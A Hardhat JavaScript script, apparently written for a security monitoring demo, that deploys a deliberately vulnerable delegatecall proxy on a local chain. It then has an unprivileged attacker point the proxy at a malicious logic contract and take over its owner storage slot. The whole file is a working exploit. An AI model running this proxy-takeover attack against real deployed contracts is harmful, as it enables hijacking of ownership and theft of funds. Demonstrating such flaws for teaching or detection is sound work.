import { network } from "hardhat";

/**
 * Live on-chain attack on DelegatecallVulnerable.sol: setImplementation() has no access
 * control, so anyone can point it at a malicious logic contract and then have `execute()`
 * run that attacker-controlled code in the PROXY's own storage context.
 *
 * Usage: npx hardhat run scripts/attack-delegatecall.js
 */
async function main() {
  const { ethers } = await network.create("localhost");
  const [, deployer, attacker] = await ethers.getSigners();

  const Proxy = await ethers.getContractFactory("DelegatecallVulnerable", deployer);
  const proxy = await Proxy.deploy();
  await proxy.waitForDeployment();
  const proxyAddress = await proxy.getAddress();
  console.log("DelegatecallVulnerable deployed at:", proxyAddress);
  console.log(">>> Register this address in the dashboard now if you want it on the Runtime Monitor.\n");

  const Malicious = await ethers.getContractFactory("MaliciousLogic", attacker);
  const malicious = await Malicious.deploy();
  await malicious.waitForDeployment();
  console.log("Malicious logic contract deployed at:", await malicious.getAddress());

  console.log("Attacker (no special privileges) sets themself as the implementation...");
  await proxy.connect(attacker).setImplementation(await malicious.getAddress());
  console.log("implementation is now:", await proxy.implementation());

  // Calldata for MaliciousLogic.pwn(address) - takes over `owner` in the PROXY's storage
  // because delegatecall runs the code with the proxy's storage layout.
  const data = malicious.interface.encodeFunctionData("pwn", [attacker.address]);

  console.log("Attacker triggers execute() - runs attacker code in the proxy's own storage...");
  const tx = await proxy.connect(attacker).execute(data);
  const receipt = await tx.wait();

  console.log("\n=== RESULT ===");
  console.log("Tx mined in block", receipt.blockNumber);
  console.log("Proxy's owner slot (storage slot 0) is now controlled by the attacker.");
  console.log("This happened with zero access control checks anywhere in the call path.");
  console.log("================\n");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
